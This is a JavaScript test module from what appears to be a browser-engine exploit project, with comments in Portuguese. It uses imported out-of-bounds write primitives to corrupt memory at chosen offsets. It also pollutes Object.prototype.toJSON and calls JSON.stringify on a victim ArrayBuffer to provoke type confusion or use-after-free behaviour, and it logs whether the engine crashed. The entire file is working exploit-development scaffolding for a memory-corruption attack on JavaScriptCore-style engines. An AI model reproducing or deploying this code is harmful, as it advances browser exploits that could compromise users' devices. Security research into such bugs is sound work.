// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// Contador global, embora a toJSON_TryWriteToThis não deva usá-lo diretamente.
// Mantido para a estrutura da executeFocusedTestForTypeError.
export let current_toJSON_call_count_for_TypeError_test = 0;

export async function executeFocusedTestForTypeError(
    testDescription,
    toJSONFunctionToUse, // A variante da função toJSON a ser testada
    valueToWriteOOB,     // O valor a ser escrito via OOB
    corruptionOffsetToTest // O offset específico para esta escrita OOB
) {
    const FNAME = `executeFocusedTestForTypeError<${testDescription}>`;
    logS3(`--- Iniciando Teste Focado: ${testDescription} ---`, "test", FNAME); // [cite: 2468]
    logS3(`    Corrupção OOB: Valor=${toHex(valueToWriteOOB)} @ Offset=${toHex(corruptionOffsetToTest)}`, "info", FNAME); // [cite: 2468]
    document.title = `Iniciando: ${testDescription}`; // [cite: 2469]

    current_toJSON_call_count_for_TypeError_test = 0; // Resetar para cada teste // [cite: 2469]

    const victim_ab_size_val = 64; // [cite: 2469]
    const bytes_to_write_val = 4; // [cite: 2470]
    const ppKey_val = 'toJSON'; // [cite: 2470]

    await triggerOOB_primitive(); // [cite: 2470]
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup.", "error", FNAME); // [cite: 2471]
        document.title = "ERRO OOB Setup - " + FNAME; // [cite: 2472]
        return { errorOccurred: new Error("OOB Setup Failed"), calls: current_toJSON_call_count_for_TypeError_test, potentiallyCrashed: false, stringifyResult: null }; // [cite: 2472]
    }
    document.title = "OOB OK - " + FNAME; // [cite: 2473]

    let victim_ab = new ArrayBuffer(victim_ab_size_val); // [cite: 2473]
    logS3(`ArrayBuffer vítima (${victim_ab_size_val} bytes) recriado.`, "info", FNAME); // [cite: 2474]

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val); // [cite: 2474]
    let pollutionApplied = false; // [cite: 2474]
    let stepReached = "antes_pp"; // [cite: 2474]
    let potentiallyCrashed = true;  // [cite: 2475]
    let errorCaptured = null; // [cite: 2475]
    let stringifyResult = null; // [cite: 2475]

    try {
        stepReached = "aplicando_pp"; // [cite: 2476]
        logS3(`Poluindo Object.prototype.${ppKey_val} com ${testDescription}...`, "info", FNAME); // [cite: 2476]
        document.title = `Aplicando PP (${testDescription})`; // [cite: 2477]
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSONFunctionToUse,
            writable: true, configurable: true, enumerable: false
        }); // [cite: 2477]
        pollutionApplied = true; // [cite: 2478]
        logS3(`PP aplicada com ${testDescription}.`, "good", FNAME); // [cite: 2478]
        stepReached = "pp_aplicada"; // [cite: 2478]
        document.title = `PP OK (${testDescription})`; // [cite: 2478]

        stepReached = "antes_escrita_oob"; // [cite: 2478]
        logS3(`CORRUPÇÃO: ${toHex(valueToWriteOOB)} @ ${toHex(corruptionOffsetToTest)}`, "warn", FNAME); // [cite: 2479]
        document.title = `Antes OOB Write (${toHex(corruptionOffsetToTest)})`; // [cite: 2479]
        oob_write_absolute(corruptionOffsetToTest, valueToWriteOOB, bytes_to_write_val); // [cite: 2479]
        logS3("Escrita OOB feita.", "info", FNAME); // [cite: 2479]
        stepReached = "apos_escrita_oob"; // [cite: 2480]
        document.title = `Após OOB Write (${toHex(corruptionOffsetToTest)})`; // [cite: 2480]

        await PAUSE_S3(SHORT_PAUSE_S3); // [cite: 2480]

        stepReached = "antes_stringify"; // [cite: 2480]
        document.title = `Antes Stringify (${toHex(corruptionOffsetToTest)})`; // [cite: 2480]
        logS3(`Chamando JSON.stringify(victim_ab) (com ${testDescription})...`, "info", FNAME); // [cite: 2481]
        
        try {
            stringifyResult = JSON.stringify(victim_ab); // [cite: 2481]
            stepReached = `apos_stringify`; // [cite: 2482]
            potentiallyCrashed = false;  // [cite: 2482]
            document.title = `Strfy OK (${testDescription})`; // [cite: 2482]
            logS3(`Resultado JSON.stringify: ${String(stringifyResult)} (Chamadas toJSON: ${current_toJSON_call_count_for_TypeError_test})`, "info", FNAME); // [cite: 2482]
        } catch (e) {
            stepReached = `erro_stringify`; // [cite: 2483]
            potentiallyCrashed = false;  // [cite: 2484]
            errorCaptured = e; // [cite: 2484]
            document.title = `ERRO Strfy (${e.name}) - ${testDescription}`; // [cite: 2484]
            logS3(`ERRO CAPTURADO JSON.stringify: ${e.name} - ${e.message}. (Chamadas toJSON: ${current_toJSON_call_count_for_TypeError_test})`, "critical", FNAME); // [cite: 2485]
            if (e.stack) logS3(`   Stack: ${e.stack}`, "error"); // [cite: 2485]
            console.error(`JSON.stringify ERROR (${testDescription}):`, e); // [cite: 2486]
        }
    } catch (mainError) {
        potentiallyCrashed = false; // [cite: 2486]
        errorCaptured = mainError; // [cite: 2487]
        logS3(`Erro principal: ${mainError.message}`, "error", FNAME); // [cite: 2487]
        document.title = "ERRO Principal - " + FNAME; // [cite: 2487]
        if (mainError.stack) logS3(`   Stack: ${mainError.stack}`, "error"); // [cite: 2488]
        console.error("Main test error:", mainError); // [cite: 2488]
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor); // [cite: 2489]
            else delete Object.prototype[ppKey_val]; // [cite: 2490]
        }
        clearOOBEnvironment(); // [cite: 2490]
        logS3(`Ambiente OOB Limpo. Último passo: ${stepReached}. Chamadas toJSON: ${current_toJSON_call_count_for_TypeError_test}.`, "info", FNAME); // [cite: 2491]
        if (potentiallyCrashed) {
             document.title = `CONGELOU? ${stepReached} - ${FNAME}`; // [cite: 2493]
             logS3(`O TESTE PODE TER CONGELADO/CRASHADO em ${stepReached}. Chamadas toJSON: ${current_toJSON_call_count_for_TypeError_test}`, "error", FNAME); // [cite: 2494]
        }
    }
    logS3(`--- Teste Focado Concluído: ${testDescription} (Chamadas toJSON: ${current_toJSON_call_count_for_TypeError_test}) ---`, "test", FNAME); // [cite: 2494]
    if (!potentiallyCrashed && !errorCaptured) {
        document.title = `Teste Concluído OK - ${testDescription}`; // [cite: 2495]
    } else if (errorCaptured && !document.title.startsWith("ERRO Strfy")) { 
        document.title = `ERRO OCORREU (${errorCaptured.name}) - ${testDescription}`; // [cite: 2496]
    }
    return { errorOccurred: errorCaptured, calls: current_toJSON_call_count_for_TypeError_test, potentiallyCrashed, stringifyResult }; // [cite: 2497]
}
